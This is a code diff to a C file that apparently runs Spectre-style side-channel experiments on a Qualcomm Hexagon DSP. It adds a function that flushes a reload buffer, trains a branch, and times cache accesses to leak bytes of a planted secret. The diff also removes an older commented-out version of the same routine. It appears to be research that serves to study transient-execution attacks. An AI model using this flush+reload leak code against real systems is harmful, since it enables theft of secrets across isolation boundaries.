@@ -59,7 +59,6 @@ int microarch_fltest(remote_handle64 h, const int* vec, int vecLen, int64* res)
   uint64_t access_time;
   unsigned char *reloadbuffer = (unsigned char *)malloc(RELOADBUFFER_SIZE);
   volatile unsigned char __attribute__ ((unused)) access_char;
-//   uint32_t shl_test = 1;
 
   // Put data in cache
   for (int i = 0; i < RELOADBUFFER_SIZE; i += STRIDE) {
@@ -92,28 +91,6 @@ int microarch_fltest(remote_handle64 h, const int* vec, int vecLen, int64* res)
 	FARF(RUNTIME_HIGH, "===============     DSP: Cache miss elapsed processor cycles: %ld ===============", access_time);
   }
 
-//   shl_test = Q6_R_asl_RI(shl_test, 9);
-//   FARF(RUNTIME_HIGH, "===============     DSP: shr_test after shift: %d ===============", shl_test);
-
-	// // flush reloadbuffer from cache
-	// for (int k = 0; k < RELOADBUFFER_SIZE; k += STRIDE) {
-	// 	Q6_dccleaninva_A(&reloadbuffer[k]);
-	// }
-	// spectre_pht(reloadbuffer, 2);
-	// for (int i = 0; i < BITS_PER_BYTE; i++) {
-	// 	barrier();
-	// 	start_time = rdtsc();
-	// 	// Read from cache
-	// 	access_char = reloadbuffer[i*STRIDE];
-	// 	end_time = rdtsc();
-	// 	barrier();
-	// 	access_time = end_time - start_time;
-	// 	if (access_time < CACHE_THRESHOLD) {
-	// 		FARF(RUNTIME_HIGH, "===============     DSP: Cache hit at: %d ===============", i);
-	// 	}
-	// }
-  
-  // *res = (int64_t)access_char;
   *res = (int64_t)res;
   FARF(RUNTIME_HIGH, "===============     DSP: sum result pointer: %p ===============", res);
 
@@ -250,13 +227,12 @@ int microarch_spectest(remote_handle64 h, const int* vec, int vecLen, int64* res
 //     uint64_t time_start;
 //     uint64_t time_end;
 //     uint64_t time_access;
-//     // uint32_t offset = 0x00ffffff;
-//     uint32_t offset = 0x007fffff;
+//     uint32_t offset = 0x00ffffff;
+//     // uint32_t offset = 0x007fffff;
 //     uint32_t target_offset;
 //     // uint8_t *target_offset;
-//     // uint32_t usr_.reg;
 //     uint8_t data_offset = sizeof(DATA)-1;
-//     uint8_t read_char = 5;
+//     uint8_t flag = 5;
 
 //     // target_offset = (unsigned char *)malloc(sizeof(unsigned char));
 //     reloadbuffer = (unsigned char *)malloc(RELOADBUFFER_SIZE*sizeof(unsigned char));
@@ -287,15 +263,15 @@ int microarch_spectest(remote_handle64 h, const int* vec, int vecLen, int64* res
 //           for(int k = 0; k < RELOADBUFFER_SIZE; k += STRIDE) {
 //               Q6_dcinva_A(&reloadbuffer[k]);
 //           }
-//           // read_char = 0;
+//           // flag = 0;
 //           // train dsp 5 times is enough
 //           for (int m = 0; m < 5; m++) {
 //               // Q6_dcinva_A(&offset);
 //               // Q6_dcinva_A(target_offset);
 //               // barrier();
               
-//               // /*read_char = */conditional_branch(reloadbuffer, data+data_offset, target_offset, offset);
-//               read_char = exe_path_test(reloadbuffer, data+data_offset, target_offset, offset);
+//               /*flag = */conditional_branch(reloadbuffer, data+data_offset, target_offset, offset);
+//               // flag = exe_path_test(reloadbuffer, data+data_offset, target_offset, offset);
 
 //               if(j != 0) {
 //                   break;
@@ -303,7 +279,7 @@ int microarch_spectest(remote_handle64 h, const int* vec, int vecLen, int64* res
 //           }
 //       }
 
-//       FARF(RUNTIME_HIGH, "===============     DSP: Read char %d = %c ===============", read_char, read_char);
+//       FARF(RUNTIME_HIGH, "===============     DSP: Flag: %d ===============", flag, flag);
 
 //       // speculate one byte of the secret each time by judging the access time to reloadbuffer
 //       for (int n = 0; n < BITS_PER_BYTE; n++) {
@@ -328,12 +304,102 @@ int microarch_spectest(remote_handle64 h, const int* vec, int vecLen, int64* res
 //   leaked[leaked_len] = '\0';
 //   FARF(RUNTIME_HIGH, "===============     DSP: Data: %s ===============", data);
 //   FARF(RUNTIME_HIGH, "===============     DSP: Leaked secret: %s ===============", leaked);
-//   // usr_reg = read_user_reg();
-//   // FARF(RUNTIME_HIGH, "===============     DSP: user reg: 0x%x ===============", usr_reg);
 //   *res = (int64_t)res;
-//   FARF(RUNTIME_HIGH, "===============     DSP: sum result pointer: %p ===============", res);
+//   // FARF(RUNTIME_HIGH, "===============     DSP: sum result pointer: %p ===============", res);
 
 //   free(reloadbuffer);
 //   // free(target_offset);
 //   return 0;
 // }
+
+int microarch_exe_path(remote_handle64 h, const int* vec, int vecLen, int64* res)
+{
+    unsigned char *reloadbuffer;
+    volatile unsigned char __attribute__ ((unused)) access_char;
+    uint64_t time_start;
+    uint64_t time_end;
+    uint64_t time_access;
+    uint32_t offset = 0x00ffffff;
+    // uint32_t offset = 0x007fffff;
+    uint32_t target_offset;
+    // uint8_t *target_offset;
+    uint8_t data_offset = sizeof(DATA)-1;
+    uint8_t flag = 5;
+
+    // target_offset = (unsigned char *)malloc(sizeof(unsigned char));
+    reloadbuffer = (unsigned char *)malloc(RELOADBUFFER_SIZE*sizeof(unsigned char));
+    // memset the reloadbuffer so that the data will be actually read to cache
+    memset(reloadbuffer, 0x0, RELOADBUFFER_SIZE);
+
+    // store secret
+    uint8_t data[128];
+    memset(data, ' ', 128);
+    memcpy(data, DATA_SECRET, sizeof(DATA_SECRET));
+    // ensure data terminates
+    data[sizeof(DATA_SECRET)-1] = '\0';
+
+    // nothing leaked so far
+    char leaked[sizeof(SECRET)];
+    int leaked_len = 0;
+    memset(leaked, ' ', sizeof(leaked));
+
+    // *target_offset = 0;
+    // target_offset = 1;
+    // for (uint8_t i = sizeof(DATA)-1; i < sizeof(DATA_SECRET)-1; i++) {
+        // train cpu to predict the branch
+        for (uint8_t j = 1; j < 2; j++) {
+          // data_offset = i * j;
+          target_offset = j;
+
+          // flush reloadbuffer from cache
+          for(int k = 0; k < RELOADBUFFER_SIZE; k += STRIDE) {
+              Q6_dcinva_A(&reloadbuffer[k]);
+          }
+          // flag = 0;
+          // train dsp 5 times is enough
+          for (int m = 0; m < 5; m++) {
+              // Q6_dcinva_A(&offset);
+              // Q6_dcinva_A(target_offset);
+              // barrier();
+              
+              // /*flag = */conditional_branch(reloadbuffer, data+data_offset, target_offset, offset);
+              flag = exe_path_test(reloadbuffer, data+data_offset, target_offset, offset);
+
+              if(j != 0) {
+                  break;
+              }
+          }
+      }
+
+      FARF(RUNTIME_HIGH, "===============     DSP: Flag: 0x%x ===============", flag, flag);
+
+      // speculate one byte of the secret each time by judging the access time to reloadbuffer
+      for (int n = 0; n < BITS_PER_BYTE; n++) {
+          time_start = rdtsc();
+          // Read from cache
+          access_char = reloadbuffer[n * STRIDE];
+          time_end = rdtsc();
+          time_access = time_end - time_start;
+          
+          if (time_access < CACHE_THRESHOLD) {
+              leaked[leaked_len] = n;
+              leaked_len++;
+              FARF(RUNTIME_HIGH, "===============     DSP: Cache hit at %d, Leaked byte %d = %c ===============", n, n, n);
+              break;
+          }
+          else {
+            // FARF(RUNTIME_HIGH, "===============     DSP: Access time %d ===============", time_access);
+          }
+      }
+    // }
+
+  leaked[leaked_len] = '\0';
+  // FARF(RUNTIME_HIGH, "===============     DSP: Data: %s ===============", data);
+  // FARF(RUNTIME_HIGH, "===============     DSP: Leaked secret: %s ===============", leaked);
+  *res = (int64_t)res;
+  // FARF(RUNTIME_HIGH, "===============     DSP: sum result pointer: %p ===============", res);
+
+  free(reloadbuffer);
+  // free(target_offset);
+  return 0;
+}
